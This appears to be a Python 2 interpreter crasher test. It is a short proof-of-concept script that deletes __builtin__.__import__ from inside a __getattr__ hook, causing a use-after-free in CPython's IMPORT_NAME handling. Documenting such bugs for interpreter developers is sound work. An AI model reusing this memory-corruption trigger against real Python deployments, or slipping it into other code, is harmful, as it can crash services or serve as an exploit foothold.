"""
PyDict_GetItem() returns a borrowed reference.
This attack is against ceval.c:IMPORT_NAME, which calls an
object (__builtin__.__import__) without holding a reference to it.
"""

import types
import __builtin__


class X(object):
    def __getattr__(self, name):
        # this is called with name == '__bases__' by PyObject_IsInstance()
        # during the unbound method call -- it frees the unbound method
        # itself before it invokes its im_func.
        del __builtin__.__import__
        return ()

pseudoclass = X()

class Y(object):
    def __call__(self, *args):
        # 'self' was freed already
        print self, args

# make an unbound method
__builtin__.__import__ = types.MethodType(Y(), None, (pseudoclass, str))
import spam
